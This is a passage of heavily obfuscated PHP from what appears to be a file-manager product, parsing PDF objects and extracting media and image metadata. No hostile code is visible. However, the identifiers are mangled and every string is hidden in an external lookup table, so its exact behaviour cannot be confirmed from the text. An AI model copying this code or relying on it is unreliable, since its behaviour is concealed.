$C°•Üàë®î[2] + $FÂê‰µ¡î‘; } else { if ($cÓê¸äÆŒî > $D”ŸÂ¡Ã¹Ã && $cÓê¸äÆŒî <= $FÂê‰µ¡î‘) { $C°•Üàë®î[2] = $C°•Üàë®î[2] + $cÓê¸äÆŒî; } } return $C°•Üàë®î; goto E™ø¬¥ë¥è; eÚ°†¨”×‘: $e¹Ï¡Õ“µŞ = $cÓê¸äÆŒî >= $FÂê‰µ¡î‘ ? $cÓê¸äÆŒî - $FÂê‰µ¡î‘ : $cÓê¸äÆŒî; $d„¶Œ£´©Š = $cÓê¸äÆŒî >= $FÂê‰µ¡î‘ ? $e­ê—ˆ¾ŸÙ[$A”§Š‚ù¬Ê[1492]] : $e­ê—ˆ¾ŸÙ[$A”§Š‚ù¬Ê[1491]]; if ($cÓê¸äÆŒî > $D”ŸÂ¡Ã¹Ã && $cÓê¸äÆŒî <= $FÂê‰µ¡î‘) { $e¹Ï¡Õ“µŞ = 0; $d„¶Œ£´©Š = StreamWrapperIO::read($e­ê—ˆ¾ŸÙ[$A”§Š‚ù¬Ê[75]], $cÓê¸äÆŒî, $D”ŸÂ¡Ã¹Ã); } goto F‹¢ì—ÓÆ; C‘Š•¹”Œ: $A”§Š‚ù¬Ê =& $_SERVER[Ä¿Ş°¨]; $D”ŸÂ¡Ã¹Ã = $e­ê—ˆ¾ŸÙ[$A”§Š‚ù¬Ê[1490]]; $FÂê‰µ¡î‘ = $e­ê—ˆ¾ŸÙ[$A”§Š‚ù¬Ê[77]] - $D”ŸÂ¡Ã¹Ã; goto eÚ°†¨”×‘; E™ø¬¥ë¥è: } private static function decodeStr($dÂË›˜) { goto FÛİó’‹¿Ğ; Fäßî âòá: $dÂË›˜ = $aäÛø‘¯ô[33]; foreach ($B¡ø¾¦‘Ü¿ as $BôĞâ°òº) { if (preg_match($aäÛø‘¯ô[1537], $BôĞâ°òº)) { $dÂË›˜ .= \chr(octdec(trim($BôĞâ°òº, $aäÛø‘¯ô[93]))); } else { $dÂË›˜ .= $BôĞâ°òº; } } $B¡ø¾¦‘Ü¿ = preg_split($aäÛø‘¯ô[1538], $dÂË›˜, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto Eò³¢æ‡ôÎ; Eò³¢æ‡ôÎ: $dÂË›˜ = $aäÛø‘¯ô[33]; foreach ($B¡ø¾¦‘Ü¿ as $BôĞâ°òº) { if (preg_match($aäÛø‘¯ô[1539], $BôĞâ°òº)) { $dÂË›˜ .= \chr(hexdec(trim($BôĞâ°òº, $aäÛø‘¯ô[1540]))); } else { $dÂË›˜ .= $BôĞâ°òº; } } $B¡ø¾¦‘Ü¿ = preg_split($aäÛø‘¯ô[1541], $dÂË›˜, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto dƒ±­ìÅÒä; C„±öÀ¾½º: return $dÂË›˜; goto fØŠ¢ßÇ·Í; FÛİó’‹¿Ğ: $aäÛø‘¯ô =& $_SERVER[Ä¿Ş°¨]; $dÂË›˜ = str_replace(array($aäÛø‘¯ô[1528], $aäÛø‘¯ô[1529], $aäÛø‘¯ô[1530], $aäÛø‘¯ô[1531], $aäÛø‘¯ô[1532], $aäÛø‘¯ô[1533], $aäÛø‘¯ô[1534], $aäÛø‘¯ô[1535]), array($aäÛø‘¯ô[93], $aäÛø‘¯ô[50], $aäÛø‘¯ô[8], $aäÛø‘¯ô[244], $aäÛø‘¯ô[804], $aäÛø‘¯ô[213], $aäÛø‘¯ô[977], $aäÛø‘¯ô[326]), $dÂË›˜); $B¡ø¾¦‘Ü¿ = preg_split($aäÛø‘¯ô[1536], $dÂË›˜, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto Fäßî âòá; dƒ±­ìÅÒä: $dÂË›˜ = $aäÛø‘¯ô[33]; foreach ($B¡ø¾¦‘Ü¿ as $BôĞâ°òº) { if (preg_match($aäÛø‘¯ô[1542], $BôĞâ°òº) && !1 === stripos($BôĞâ°òº, $aäÛø‘¯ô[1543])) { $BôĞâ°òº = preg_replace($aäÛø‘¯ô[1544], $aäÛø‘¯ô[33], $BôĞâ°òº); $BôĞâ°òº = trim($BôĞâ°òº, $aäÛø‘¯ô[913]); $BôĞâ°òº = pack($aäÛø‘¯ô[1545], $BôĞâ°òº); $dÂË›˜ .= $BôĞâ°òº; } else { $dÂË›˜ .= $BôĞâ°òº; } } if (preg_match($aäÛø‘¯ô[1546], $dÂË›˜)) { $CÔêøƒ —Š = substr($dÂË›˜, 2); $dÂË›˜ = $aäÛø‘¯ô[33]; $B‰İ´È‰‘ = strlen($CÔêøƒ —Š); for ($fÄ°¥è¬§ = 0; $fÄ°¥è¬§ < $B‰İ´È‰‘; $fÄ°¥è¬§ += 2) { $dğ‚¿£Šêê = hexdec(bin2hex(substr($CÔêøƒ —Š, $fÄ°¥è¬§, 2))); $dÂË›˜ .= mb_convert_encoding($aäÛø‘¯ô[1547] . intval($dğ‚¿£Šêê) . $aäÛø‘¯ô[67], $aäÛø‘¯ô[1548], $aäÛø‘¯ô[1549]); } } goto C„±öÀ¾½º; fØŠ¢ßÇ·Í: } private static function getRawObject($dà‹†øÔ‡Ö, $FŠÄÃÊí¶ = 0) { goto bƒœ ¥„—; Cæœ®÷ò×: $FŠÄÃÊí¶ += strspn($dà‹†øÔ‡Ö, $e™ËÖ¢¡î±[1550], $FŠÄÃÊí¶); $aëï³ÁˆÀ = $dà‹†øÔ‡Ö[$FŠÄÃÊí¶]; switch ($aëï³ÁˆÀ) { case $e™ËÖ¢¡î±[1551]: $D›ÎÛ¬À¶é = strcspn($dà‹†øÔ‡Ö, $e™ËÖ¢¡î±[1552], $FŠÄÃÊí¶); if ($D›ÎÛ¬À¶é > 0) { $FŠÄÃÊí¶ += $D›ÎÛ¬À¶é; return self::getRawObject($dà‹†øÔ‡Ö, $FŠÄÃÊí¶); } break; case $e™ËÖ¢¡î±[8]: $DŞ°§‡ºë‰ = $aëï³ÁˆÀ; ++$FŠÄÃÊí¶; $AÏßšõõ = preg_match($e™ËÖ¢¡î±[1553], substr($dà‹†øÔ‡Ö, $FŠÄÃÊí¶, 256), $b˜Ä¬¥‚ßß); if (1 == $AÏßšõõ) { $eŒ”æ‰µºŸ = $b˜Ä¬¥‚ßß[1]; $FŠÄÃÊí¶ += strlen($eŒ”æ‰µºŸ); } break; case $e™ËÖ¢¡î±[244]: case $e™ËÖ¢¡î±[804]: $DŞ°§‡ºë‰ = $aëï³ÁˆÀ; ++$FŠÄÃÊí¶; $bšøÅªœÃ = $FŠÄÃÊí¶; if ($e™ËÖ¢¡î±[244] == $aëï³ÁˆÀ) { $BÚ×•Å‹‰Ñ = 1; while ($BÚ×•Å‹‰Ñ > 0) { if (!isset($dà‹†øÔ‡Ö[$bšøÅªœÃ])) { break; } $AˆÃøØÅ÷É = $dà‹†øÔ‡Ö[$bšøÅªœÃ]; switch ($AˆÃøØÅ÷É) { case $e™ËÖ¢¡î±[93]: ++$bšøÅªœÃ; break; case $e™ËÖ¢¡î±[244]: ++$BÚ×•Å‹‰Ñ; break; case $e™ËÖ¢¡î±[804]: --$BÚ×•Å‹‰Ñ; break; } ++$bšøÅªœÃ; } $eŒ”æ‰µºŸ = substr($dà‹†øÔ‡Ö, $FŠÄÃÊí¶, $bšøÅªœÃ - $FŠÄÃÊí¶ - 1); $FŠÄÃÊí¶ = $bšøÅªœÃ; } break; case $e™ËÖ¢¡î±[153]: case $e™ËÖ¢¡î±[480]: $DŞ°§‡ºë‰ = $aëï³ÁˆÀ; ++$FŠÄÃÊí¶; if ($e™ËÖ¢¡î±[153] == $aëï³ÁˆÀ) { $eŒ”æ‰µºŸ = array(); do { $fé„¤÷ ¹™ = $FŠÄÃÊí¶; $AÉ£¢Š–„ø = self::getRawObject($dà‹†øÔ‡Ö, $FŠÄÃÊí¶); $FŠÄÃÊí¶ = $AÉ£¢Š–„ø[2]; $eŒ”æ‰µºŸ[] = $AÉ£¢Š–„ø; } while ($e™ËÖ¢¡î±[480] != $AÉ£¢Š–„ø[0] && $FŠÄÃÊí¶ != $fé„¤÷ ¹™); array_pop($eŒ”æ‰µºŸ); } break; case $e™ËÖ¢¡î±[912]: case $e™ËÖ¢¡î±[915]: if (isset($dà‹†øÔ‡Ö[$FŠÄÃÊí¶ + 1]) && $dà‹†øÔ‡Ö[$FŠÄÃÊí¶ + 1] == $aëï³ÁˆÀ) { $DŞ°§‡ºë‰ = $aëï³ÁˆÀ . $aëï³ÁˆÀ; $FŠÄÃÊí¶ += 2; if ($e™ËÖ¢¡î±[912] == $aëï³ÁˆÀ) { $eŒ”æ‰µºŸ = array(); do { $fé„¤÷ ¹™ = $FŠÄÃÊí¶; $AÉ£¢Š–„ø = self::getRawObject($dà‹†øÔ‡Ö, $FŠÄÃÊí¶); $FŠÄÃÊí¶ = $AÉ£¢Š–„ø[2]; $eŒ”æ‰µºŸ[] = $AÉ£¢Š–„ø; } while ($e™ËÖ¢¡î±[1554] != $AÉ£¢Š–„ø[0] && $FŠÄÃÊí¶ != $fé„¤÷ ¹™); array_pop($eŒ”æ‰µºŸ); } } else { $DŞ°§‡ºë‰ = $aëï³ÁˆÀ; ++$FŠÄÃÊí¶; $AÏßšõõ = preg_match($e™ËÖ¢¡î±[1555], substr($dà‹†øÔ‡Ö, $FŠÄÃÊí¶), $b˜Ä¬¥‚ßß); if ($e™ËÖ¢¡î±[912] == $aëï³ÁˆÀ && 1 == $AÏßšõõ) { $eŒ”æ‰µºŸ = strtr($b˜Ä¬¥‚ßß[1], $e™ËÖ¢¡î±[1556], $e™ËÖ¢¡î±[33]); $FŠÄÃÊí¶ += \strlen($b˜Ä¬¥‚ßß[0]); } elseif (!1 !== ($E®¢Çö´ = strpos($dà‹†øÔ‡Ö, $e™ËÖ¢¡î±[915], $FŠÄÃÊí¶))) { $FŠÄÃÊí¶ = $E®¢Çö´ + 1; } } break; default: if ($e™ËÖ¢¡î±[1557] == substr($dà‹†øÔ‡Ö, $FŠÄÃÊí¶, 6)) { $DŞ°§‡ºë‰ = $e™ËÖ¢¡î±[1557]; $FŠÄÃÊí¶ += 6; } elseif ($e™ËÖ¢¡î±[99] == substr($dà‹†øÔ‡Ö, $FŠÄÃÊí¶, 4)) { $DŞ°§‡ºë‰ = $e™ËÖ¢¡î±[99]; $FŠÄÃÊí¶ += 4; $eŒ”æ‰µºŸ = $e™ËÖ¢¡î±[99]; } elseif ($e™ËÖ¢¡î±[1558] == substr($dà‹†øÔ‡Ö, $FŠÄÃÊí¶, 4)) { $DŞ°§‡ºë‰ = $e™ËÖ¢¡î±[1559]; $FŠÄÃÊí¶ += 4; $eŒ”æ‰µºŸ = $e™ËÖ¢¡î±[1558]; } elseif ($e™ËÖ¢¡î±[1560] == substr($dà‹†øÔ‡Ö, $FŠÄÃÊí¶, 5)) { $DŞ°§‡ºë‰ = $e™ËÖ¢¡î±[1559]; $FŠÄÃÊí¶ += 5; $eŒ”æ‰µºŸ = $e™ËÖ¢¡î±[1560]; } elseif ($e™ËÖ¢¡î±[1561] == substr($dà‹†øÔ‡Ö, $FŠÄÃÊí¶, 6)) { $DŞ°§‡ºë‰ = $e™ËÖ¢¡î±[1561]; $FŠÄÃÊí¶ += 6; if (1 == preg_match($e™ËÖ¢¡î±[1562], substr($dà‹†øÔ‡Ö, $FŠÄÃÊí¶), $b˜Ä¬¥‚ßß)) { $FŠÄÃÊí¶ += strlen($b˜Ä¬¥‚ßß[0]); $C•œâä½»× = $e™ËÖ¢¡î±[1563]; $AÏßšõõ = preg_match($C•œâä½»×, substr($dà‹†øÔ‡Ö, $FŠÄÃÊí¶), $b˜Ä¬¥‚ßß, PREG_OFFSET_CAPTURE); if (1 == $AÏßšõõ) { $eŒ”æ‰µºŸ = substr($dà‹†øÔ‡Ö, $FŠÄÃÊí¶, $b˜Ä¬¥‚ßß[0][1]); $FŠÄÃÊí¶ += $b˜Ä¬¥‚ßß[1][1]; } } } elseif ($e™ËÖ¢¡î±[1564] == substr($dà‹†øÔ‡Ö, $FŠÄÃÊí¶, 9)) { $DŞ°§‡ºë‰ = $e™ËÖ¢¡î±[1564]; $FŠÄÃÊí¶ += 9; } elseif (1 == preg_match($e™ËÖ¢¡î±[1565], substr($dà‹†øÔ‡Ö, $FŠÄÃÊí¶, 33), $b˜Ä¬¥‚ßß)) { $DŞ°§‡ºë‰ = $e™ËÖ¢¡î±[1527]; $FŠÄÃÊí¶ += strlen($b˜Ä¬¥‚ßß[0]); $eŒ”æ‰µºŸ = intval($b˜Ä¬¥‚ßß[1]) . $e™ËÖ¢¡î±[70] . intval($b˜Ä¬¥‚ßß[2]); } elseif (1 == preg_match($e™ËÖ¢¡î±[1566], substr($dà‹†øÔ‡Ö, $FŠÄÃÊí¶, 33), $b˜Ä¬¥‚ßß)) { $DŞ°§‡ºë‰ = $e™ËÖ¢¡î±[1567]; $eŒ”æ‰µºŸ = intval($b˜Ä¬¥‚ßß[1]) . $e™ËÖ¢¡î±[70] . intval($b˜Ä¬¥‚ßß[2]); $FŠÄÃÊí¶ += strlen($b˜Ä¬¥‚ßß[0]); } elseif (($F›¯¸ñ»Šà = strspn($dà‹†øÔ‡Ö, $e™ËÖ¢¡î±[1568], $FŠÄÃÊí¶)) > 0) { $DŞ°§‡ºë‰ = $e™ËÖ¢¡î±[1569]; $eŒ”æ‰µºŸ = substr($dà‹†øÔ‡Ö, $FŠÄÃÊí¶, $F›¯¸ñ»Šà); $FŠÄÃÊí¶ += $F›¯¸ñ»Šà; } break; } goto bÓ¥Ãæ¾­; bÓ¥Ãæ¾­: return array($DŞ°§‡ºë‰, $eŒ”æ‰µºŸ, $FŠÄÃÊí¶); goto Eáí‡Ó˜–; bƒœ ¥„—: $e™ËÖ¢¡î± =& $_SERVER[Ä¿Ş°¨]; $DŞ°§‡ºë‰ = $e™ËÖ¢¡î±[33]; $eŒ”æ‰µºŸ = $e™ËÖ¢¡î±[33]; goto Cæœ®÷ò×; Eáí‡Ó˜–: } } class GetInfo { private static $fileTypeArray; public static function get($bó‡ãÏ§Ï) { $c¦‚´®â  = IO::info($bó‡ãÏ§Ï); return self::infoAdd($c¦‚´®â ); } public static function infoAdd(&$fÏ™­”Êˆ) { goto c™•Ç®Ñˆ»; cà·Ñ¨“‘ß: if (!$fÏ™­”Êˆ || $fÏ™­”Êˆ[$däƒÄÌ£Úó[29]] != $däƒÄÌ£Úó[163]) { return; } if (!self::support($fÏ™­”Êˆ[$däƒÄÌ£Úó[156]]) || isset($fÏ™­”Êˆ[$däƒÄÌ£Úó[430]])) { return; } $AÔ‹Óãª = $däƒÄÌ£Úó[1571] . $fÏ™­”Êˆ[$däƒÄÌ£Úó[75]]; goto cÊ‰à³îöİ; fçÂìÚæÇ: $fÜ¡ùŸº¹¸[$däƒÄÌ£Úó[377]] = $fÂÀ¹Å…•Ÿ; $fÏ™­”Êˆ[$däƒÄÌ£Úó[430]] = $fÜ¡ùŸº¹¸; return $fÏ™­”Êˆ; goto aïã‚ñˆ¢¥; cÊ‰à³îöİ: $fÂÀ¹Å…•Ÿ = $fÏ™­”Êˆ[$däƒÄÌ£Úó[156]]; try { if ($fÏ™­”Êˆ[$däƒÄÌ£Úó[156]] == $däƒÄÌ£Úó[1572]) { $fÜ¡ùŸº¹¸ = self::psdParse($AÔ‹Óãª); $fÂÀ¹Å…•Ÿ = $däƒÄÌ£Úó[1573]; } else { if ($fÏ™­”Êˆ[$däƒÄÌ£Úó[156]] == $däƒÄÌ£Úó[1574]) { $fÜ¡ùŸº¹¸ = self::pdfParse($AÔ‹Óãª); } else { $fÂÀ¹Å…•Ÿ = self::$fileTypeArray[$däƒÄÌ£Úó[1575]][$fÏ™­”Êˆ[$däƒÄÌ£Úó[156]]]; $D½ÂÂ‡ñ—Á = self::$fileTypeArray[$däƒÄÌ£Úó[1576]][$fÂÀ¹Å…•Ÿ][$däƒÄÌ£Úó[1577]]; $bá‰ä‰Ü£ñ = @$Bí•±”…÷->analyze($AÔ‹Óãª, $fÏ™­”Êˆ[$däƒÄÌ£Úó[77]], $fÏ™­”Êˆ[$däƒÄÌ£Úó[28]]); $fÜ¡ùŸº¹¸ = self::parseData($bá‰ä‰Ü£ñ, $D½ÂÂ‡ñ—Á, $fÏ™­”Êˆ); } } } catch (Exception $BØ›Ñ÷­­) { $fÜ¡ùŸº¹¸ = array($däƒÄÌ£Úó[377] => $fÂÀ¹Å…•Ÿ); } if (!$fÜ¡ùŸº¹¸) { return; } goto fçÂìÚæÇ; c™•Ç®Ñˆ»: $däƒÄÌ£Úó =& $_SERVER[Ä¿Ş°¨]; static $Bí•±”…÷; if (!$Bí•±”…÷) { require SDK_DIR . $däƒÄÌ£Úó[1570]; $Bí•±”…÷ = new getID3(); } goto cà·Ñ¨“‘ß; aïã‚ñˆ¢¥: } public static function support($BÕ°­Ä™ôÙ) { goto BôŒª®òº†; EáÙÎ‚Ó¶á: return !1; goto fîò©ïà–; BôŒª®òº†: $E˜İ·“ƒ’ =& $_SERVER[Ä¿Ş°¨]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $BÕ°­Ä™ôÙ = strtolower($BÕ°­Ä™ôÙ); goto AÓ¨¥±ã­; AÓ¨¥±ã­: $e©ª²ß«Ö… = array($E˜İ·“ƒ’[1574], $E˜İ·“ƒ’[1572]); if (in_array($BÕ°­Ä™ôÙ, $e©ª²ß«Ö…)) { return !0; } if (isset(self::$fileTypeArray[$E˜İ·“ƒ’[1575]][$BÕ°­Ä™ôÙ])) { return !0; } goto EáÙÎ‚Ó¶á; fîò©ïà–: } private static function parseData($CÍßÏáİ×©, $Cš¾µÏ—ƒ, $c‰Ğ÷„‘µ­) { $eò„íóÄ‡ƒ =& $_SERVER[Ä¿Ş°¨]; $bƒŠÕ†ƒÖ = $CÍßÏáİ×©[$eò„íóÄ‡ƒ[1578]]; $DÉ‚Îã˜ = array(); foreach ($Cš¾µÏ—ƒ as $fÁÍŸìçŞÔ => $aÄ’ò¢ìö™) { foreach ($aÄ’ò¢ìö™ as $béë‘â×òÄ) { if (is_array($béë‘â×òÄ)) { $bñÜĞà‚” = self::parseData($CÍßÏáİ×©, $aÄ’ò¢ìö™, $c‰Ğ÷„‘µ­); if ($bñÜĞà‚”) { $DÉ‚Îã˜[$fÁÍŸìçŞÔ] = $bñÜĞà‚”; } break; } $bÉ‰Ğ™ÊËğ = str_replace($eò„íóÄ‡ƒ[1352], $bƒŠÕ†ƒÖ, $béë‘â×òÄ); $bñÜĞà‚” = _get($CÍßÏáİ×©, $bÉ‰Ğ™ÊËğ); $bñÜĞà‚” = is_array($bñÜĞà‚”) ? $bñÜĞà‚”[0] : $bñÜĞà‚”; if ($bñÜĞà‚”) { break; } } if ($bñÜĞà‚” || $bñÜĞà‚” === 0 || $bñÜĞà‚” === !1) { $bñÜĞà‚” = self::valueReset($béë‘â×òÄ, $bñÜĞà‚”, $fÁÍŸìçŞÔ); if ($bñÜĞà‚” !== null) { $DÉ‚Îã˜[$fÁÍŸìçŞÔ] = $bñÜĞà‚”; } } } $DÉ‚Îã˜ = self::valueResetAll($DÉ‚Îã˜, $c‰Ğ÷„‘µ­); return $DÉ‚Îã˜; } private static function psdParse($Eñ¤â‰Ü¾ë) { $AäÇöœÖ› =& $_SERVER[Ä¿Ş°¨]; if (IO::fileSubstr($Eñ¤â‰Ü¾ë, 0, 4) != $AäÇöœÖ›[1579]) { return !1; } $BÜÄˆÈÍ•Õ = getImageSize($Eñ¤â‰Ü¾ë, $Dáø†‡—Çã); if (!$BÜÄˆÈÍ•Õ) { return; } $dÒ®Õõí = array($AäÇöœÖ›[1494] => $BÜÄˆÈÍ•Õ[0], $AäÇöœÖ›[1496] => $BÜÄˆÈÍ•Õ[1]); return $dÒ®Õõí; } private static function pdfParse($D‡ÃŞ‚¬) { return FileParsePdf::parse($D‡ÃŞ‚¬); } private static function fileTypeParse() { $D˜ééË‡ =& $_SERVER[Ä¿Ş°¨]; $Aç…¥èÕÇ„ = self::fileTypeArray(); $eªš¡Á·˜¸ = array(); foreach ($Aç…¥èÕÇ„ as $Aß´Ù±ó => $B˜Ò¡İ¦ó©) { $EíÖ˜¢ƒ÷ì = _get($B˜Ò¡İ¦ó©, $D˜ééË‡[156], $D˜ééË‡[33]); $FÔ°²Í‰­ = is_string($EíÖ˜¢ƒ÷ì) ? explode($D˜ééË‡[47], $EíÖ˜¢ƒ÷ì) : $EíÖ˜¢ƒ÷ì; if (!$FÔ°²Í‰­) { continue; } foreach ($FÔ°²Í‰­ as $EíÖ˜¢ƒ÷ì) { $EíÖ˜¢ƒ÷ì = strtolower(trim($EíÖ˜¢ƒ÷ì)); if (!$EíÖ˜¢ƒ÷ì) { continue; } $eªš¡Á·˜¸[$EíÖ˜¢ƒ÷ì] = $Aß´Ù±ó; } $Aç…¥èÕÇ„[$Aß´Ù±ó][$D˜ééË‡[156]] = array_keys($eªš¡Á·˜¸); $Aç…¥èÕÇ„[$Aß´Ù±ó][$D˜ééË‡[1577]] = self::parseKeyMap($B˜Ò¡İ¦ó©[$D˜ééË‡[1577]]); } return array($D˜ééË‡[1576] => $Aç…¥èÕÇ„, $D˜ééË‡[1575] => $eªš¡Á·˜¸); } private static function parseKeyMap($B¹é‡¡¹‘‡) { $BÀ›µòµŒ =& $_SERVER[Ä¿Ş°¨]; foreach ($B¹é‡¡¹‘‡ as $bÊÈ˜Âƒ— => $AŞî‡ö°Úó) { if (is_array($AŞî‡ö°Úó)) { $F¯©¨…§÷ = self::parseKeyMap($AŞî‡ö°Úó); if ($F¯©¨…§÷) { $B¹é‡¡¹‘‡[$bÊÈ˜Âƒ—] = $F¯©¨…§÷; } continue; } $FªŒ‡±é¯ƒ = explode($BÀ›µòµŒ[47], $AŞî‡ö°Úó); $CªŠ×ƒÓ = array(); foreach ($FªŒ‡±é¯ƒ as $d·Ğ­Ù×Ğ¦) { $d·Ğ­Ù×Ğ¦ = trim($d·Ğ­Ù×Ğ¦); if (!$d·Ğ­Ù×Ğ¦) { continue; } if (preg_match($BÀ›µòµŒ[1580], $d·Ğ­Ù×Ğ¦, $A¦àóÛÙ™è)) { $aõë¢¢ğî± = explode($BÀ›µòµŒ[267], $A¦àóÛÙ™è[1]); foreach ($aõë¢¢ğî± as $d‹åÎÙ) { $CªŠ×ƒÓ[] = str_replace($A¦àóÛÙ™è[0], $d‹åÎÙ, $d·Ğ­Ù×Ğ¦); } } else { $CªŠ×ƒÓ[] = $d·Ğ­Ù×Ğ¦; } } $B¹é‡¡¹‘‡[$bÊÈ˜Âƒ—] = $CªŠ×ƒÓ; } return $B¹é‡¡¹‘‡; } private static function valueResetAll($fÉ³á§ñÍÌ, $cù¾—ÂƒçŞ) { goto eÀ¢Êàì¡Ã; eÀ¢Êàì¡Ã: $CÅç³±“”Ã =& $_SERVER[Ä¿Ş°¨]; if (isset($fÉ³á§ñÍÌ[$CÅç³±“”Ã[1581]])) { $D¸‘¨Ä‡Ã = ceil($fÉ³á§ñÍÌ[$CÅç³±“”Ã[1581]]); $F¢Ü§Ø–²¨ = intval($D¸‘¨Ä‡Ã / 3600); $D‹ƒÁÕ³ö = intval(($D¸‘¨Ä‡Ã - $F¢Ü§Ø–²¨ * 3600) / 60); $e„æŒÜô×‘ = $D¸‘¨Ä‡Ã % 60; $fÉ³á§ñÍÌ[$CÅç³±“”Ã[1582]] = sprintf($CÅç³±“”Ã[1583], $F¢Ü§Ø–²¨, $D‹ƒÁÕ³ö, $e„æŒÜô×‘); if ($F¢Ü§Ø–²¨ == 0) { $fÉ³á§ñÍÌ[$CÅç³±“”Ã[1582]] = sprintf($CÅç³±“”Ã[1584], $D‹ƒÁÕ³ö, $e„æŒÜô×‘); } } $bÆ…İºÌ½· = _get($fÉ³á§ñÍÌ, $CÅç³±“”Ã[1585]); goto f‹ÌÒùƒó»; cä¢À•ªó÷: return $fÉ³á§ñÍÌ; goto eÆ¶”°õ´; f‹ÌÒùƒó»: if ($bÆ…İºÌ½·) { $A÷±ø¥ß = IO_PATH_SYSTEM_TEMP . $CÅç³±“”Ã[1586] . KodIO::hashPath($cù¾—ÂƒçŞ) . $CÅç³±“”Ã[1587]; $fÉ³á§ñÍÌ[$CÅç³±“”Ã[1588]] = Action($CÅç³±“”Ã[1589])->pluginCacheFileSet($A÷±ø¥ß, $bÆ…İºÌ½·); unset($fÉ³á§ñÍÌ[$CÅç³±“”Ã[1590]][$CÅç³±“”Ã[1573]]); } $bˆŠï•£‘± = _get($fÉ³á§ñÍÌ, $CÅç³±“”Ã[1591], $CÅç³±“”Ã[33]); $AÜËá´œ•Ó = _get($fÉ³á§ñÍÌ, $CÅç³±“”Ã[1592], $CÅç³±“”Ã[33]); goto b‚ƒâºÌ¹; b‚ƒâºÌ¹: $díËğ¼™ÎŸ = _get($fÉ³á§ñÍÌ, $CÅç³±“”Ã[1593], $CÅç³±“”Ã[33]); $bºÉ„×‚‘› = $bˆŠï•£‘± . $AÜËá´œ•Ó . $díËğ¼™ÎŸ; if ($bºÉ„×‚‘› && get_charset($bºÉ„×‚‘›) != $CÅç³±“”Ã[322]) { $fÉ³á§ñÍÌ[$CÅç³±“”Ã[1590]][$CÅç³±“”Ã[1304]] = iconv_to($fÉ³á§ñÍÌ[$CÅç³±“”Ã[1590]][$CÅç³±“”Ã[1304]], get_charset($bºÉ„×‚‘›), $CÅç³±“”Ã[322]); $fÉ³á§ñÍÌ[$CÅç³±“”Ã[1590]][$CÅç³±“”Ã[1594]] = iconv_to($fÉ³á§ñÍÌ[$CÅç³±“”Ã[1590]][$CÅç³±“”Ã[1594]], get_charset($bºÉ„×‚‘›), $CÅç³±“”Ã[322]); $fÉ³á§ñÍÌ[$CÅç³±“”Ã[1590]][$CÅç³±“”Ã[1595]] = iconv_to($fÉ³á§ñÍÌ[$CÅç³±“”Ã[1590]][$CÅç³±“”Ã[1595]], get_charset($bºÉ„×‚‘›), $CÅç³±“”Ã[322]); } goto cä¢À•ªó÷; eÆ¶”°õ´: } private static function valueReset($A÷¤µÑ¸ï, $fİ×¦¢ç“†, $B¾ ƒ¡¶ùÁ) { $bÎ‰¯Á ²é =& $_SERVER[Ä¿Ş°¨]; $C‡™÷Õ÷Ÿ = $bÎ‰¯Á ²é[1511]; switch ($A÷¤µÑ¸ï) { case $bÎ‰¯Á ²é[1596]: $fİ×¦¢ç“† = $fİ×¦¢ç“† == $bÎ‰¯Á ²é[83] ? $bÎ‰¯Á ²é[1597] : $bÎ‰¯Á ²é[1598]; break; case $bÎ‰¯Á ²é[1599]: $fİ×¦¢ç“† = $fİ×¦¢ç“† ? $fİ×¦¢ç“† : null; break; default: break; } switch ($B¾ ƒ¡¶ùÁ) { case $bÎ‰¯Á ²é[1600]: $fİ×¦¢ç“† = round($fİ×¦¢ç“†, 2); break; case $bÎ‰¯Á ²é[183]: case $bÎ‰¯Á ²é[106]: if ($fİ×¦¢ç“† < 0) { $fİ×¦¢ç“† = null; } else { if (is_numeric($fİ×¦¢ç“†)) { $fİ×¦¢ç“† = date($C‡™÷Õ÷Ÿ, $fİ×¦¢ç“†); } } break; default: break; } return $fİ×¦¢ç“†; } private static function fileTypeArray() { $c­¶¡óÊ”Í =& $_SERVER[Ä¿Ş°¨]; return array($c­¶¡óÊ”Í[1573] => array($c­¶¡óÊ”Í[156] => $c­¶¡óÊ”Í[1601] . $c­¶¡óÊ”Í[1602], $c­¶¡óÊ”Í[1577] => array($c­¶¡óÊ”Í[1494] => $c­¶¡óÊ”Í[1603], $c­¶¡óÊ”Í[1496] => $c­¶¡óÊ”Í[1604], $c­¶¡óÊ”Í[1605] => $c­¶¡óÊ”Í[1606], $c­¶¡óÊ”Í[1607] => $c­¶¡óÊ”Í[1608], $c­¶¡óÊ”Í[183] => $c­¶¡óÊ”Í[1609], $c­¶¡óÊ”Í[106] => $c­¶¡óÊ”Í[1610], $c­¶¡óÊ”Í[1611] => $c­¶¡óÊ”Í[1612], $c­¶¡óÊ”Í[1613] => $c­¶¡óÊ”Í[1614], $c­¶¡óÊ”Í[1615] => $c­¶¡óÊ”Í[1616], $c­¶¡óÊ”Í[1617] => $c­¶¡óÊ”Í[1618], $c­¶¡óÊ”Í[1619] => $c­¶¡óÊ”Í[1620], $c­¶¡óÊ”Í[1621] => $c­¶¡óÊ”Í[1622], $c­¶¡óÊ”Í[1623] => $c­¶¡óÊ”Í[1624], $c­¶¡óÊ”Í[1625] => array($c­¶¡óÊ”Í[1626] => $c­¶¡óÊ”Í[1627], $c­¶¡óÊ”Í[1628] => $c­¶¡óÊ”Í[1629], $c­¶¡óÊ”Í[1630] => $c­¶¡óÊ”Í[1631]), $c­¶¡óÊ”Í[1632] => $c­¶¡óÊ”Í[1633], $c­¶¡óÊ”Í[1634] => $c­¶¡óÊ”Í[1635], $c­¶¡óÊ”Í[1636] => $c­¶¡óÊ”Í[1637], $c­¶¡óÊ”Í[1638] => $c­¶¡óÊ”Í[1639], $c­¶¡óÊ”Í[1640] => array($c­¶¡óÊ”Í[1641] => $c­¶¡óÊ”Í[1642], $c­¶¡óÊ”Í[1643] => $c­¶¡óÊ”Í[1644], $c­¶¡óÊ”Í[1645] => $c­¶¡óÊ”Í[1646], $c­¶¡óÊ”Í[1647] => $c­¶¡óÊ”Í[1648], $c­¶¡óÊ”Í[1649] => $c­¶¡óÊ”Í[1650], $c­¶¡óÊ”Í[1651] => $c­¶¡óÊ”Í[1652], $c­¶¡óÊ”Í[1653] => $c­¶¡óÊ”Í[1654], $c­¶¡óÊ”Í[1655] => $c­¶¡óÊ”Í[1656], $c­¶¡óÊ”Í[1657] => $c­¶¡óÊ”Í[1658], 